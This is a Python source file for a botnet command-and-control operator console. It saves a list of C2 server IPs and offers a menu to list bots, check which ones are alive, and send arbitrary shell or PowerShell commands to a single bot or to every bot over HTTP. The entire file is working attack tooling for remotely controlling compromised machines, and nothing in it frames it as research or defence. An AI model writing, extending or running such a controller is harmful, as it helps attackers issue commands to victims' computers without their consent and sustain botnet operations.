import requests
import json
import os

C2_FILE = "c2_ips.json"
PORT = 8080

def save_c2s(ips):
    with open(C2_FILE, "w") as f:
        json.dump(ips, f)

def load_c2s():
    if os.path.exists(C2_FILE):
        with open(C2_FILE, "r") as f:
            try:
                return json.load(f)
            except:
                return ask_for_c2s()
    return ask_for_c2s()

def ask_for_c2s():
    raw = input("Enter one or more C2 IPs (comma-separated): ").strip()
    ips = [ip.strip() for ip in raw.split(",") if ip.strip()]
    save_c2s(ips)
    return ips

def choose_c2(c2s):
    if len(c2s) == 1:
        return c2s[0]
    print("\nAvailable C2s:")
    for i, ip in enumerate(c2s):
        print(f"{i + 1}) {ip}")
    try:
        idx = int(input("Select C2: ").strip())
        return c2s[idx - 1]
    except:
        return c2s[0]

def print_menu():
    print("""
=== C2 CLI ===
1. List bots
2. Heartbeat check
3. Send command to one bot
4. Run command on all bots
5. Push command to all bots
6. Show C2 status
7. Change all C2 IPs
8. Exit
9. Add a new C2
10. Remove a C2
""")

def list_bots(c2):
    try:
        r = requests.get(f"http://{c2}:{PORT}/bots", timeout=5)
        bots = r.json()
        print(f"\n[✓] {len(bots)} bots found:")
        for b in bots:
            print(f" - {b}")
    except Exception as e:
        print(f"[!] Error: {e}")

def heartbeat(c2):
    try:
        r = requests.get(f"http://{c2}:{PORT}/heartbeat", timeout=10)
        data = r.json()
        print(f"\n[✓] {data['count']} alive:")
        for ip in data["alive"]:
            print(f" - {ip}")
    except Exception as e:
        print(f"[!] Heartbeat failed: {e}")

def send_to_one(c2):
    botid = input("Bot ID (hostname_UUID): ").strip()
    cmd = input("Command (use ps: prefix for PowerShell): ").strip()
    payload = {"botid": botid, "cmd": cmd}
    try:
        r = requests.post(f"http://{c2}:{PORT}/sendcmd", json=payload, timeout=5)
        print("[✓]", r.json())
    except Exception as e:
        print("[!] Failed:", e)

def run_all(c2):
    cmd = input("Command to run on ALL bots: ").strip()
    try:
        r = requests.post(f"http://{c2}:{PORT}/runall", json={"cmd": cmd}, timeout=10)
        print("[✓]", r.json())
    except Exception as e:
        print("[!] Failed:", e)

def broadcast_all(c2):
    cmd = input("Command to PUSH to live bots: ").strip()
    try:
        r = requests.post(f"http://{c2}:{PORT}/broadcast", json={"cmd": cmd}, timeout=10)
        print("[✓]", r.json())
    except Exception as e:
        print("[!] Failed:", e)

def show_status(c2):
    try:
        r = requests.get(f"http://{c2}:{PORT}/check", timeout=5)
        print("\nC2 Status:")
        for k, v in r.json().items():
            print(f" - {k}: {v}")
    except Exception as e:
        print("[!] Failed:", e)

def add_c2(c2s):
    new_ip = input("Enter new C2 IP: ").strip()
    if new_ip and new_ip not in c2s:
        c2s.append(new_ip)
        save_c2s(c2s)
        print("[+] C2 added.")
    else:
        print("[!] Invalid or duplicate.")

def remove_c2(c2s):
    if not c2s:
        print("[!] No C2s saved.")
        return
    print("\nCurrent C2s:")
    for i, ip in enumerate(c2s):
        print(f"{i + 1}) {ip}")
    try:
        idx = int(input("Remove which number: ").strip()) - 1
        removed = c2s.pop(idx)
        save_c2s(c2s)
        print(f"[-] Removed {removed}")
    except:
        print("[!] Invalid selection.")

def main():
    c2s = load_c2s()
    while True:
        print_menu()
        choice = input("Choice: ").strip()
        if choice in {"1", "2", "3", "4", "5", "6"} and not c2s:
            print("[!] No C2 IPs set.")
            continue
        if choice == "1":
            list_bots(choose_c2(c2s))
        elif choice == "2":
            heartbeat(choose_c2(c2s))
        elif choice == "3":
            send_to_one(choose_c2(c2s))
        elif choice == "4":
            run_all(choose_c2(c2s))
        elif choice == "5":
            broadcast_all(choose_c2(c2s))
        elif choice == "6":
            show_status(choose_c2(c2s))
        elif choice == "7":
            c2s = ask_for_c2s()
        elif choice == "8":
            print("Exiting.")
            break
        elif choice == "9":
            add_c2(c2s)
        elif choice == "10":
            remove_c2(c2s)
        else:
            print("[!] Invalid option.")

if __name__ == "__main__":
    main()
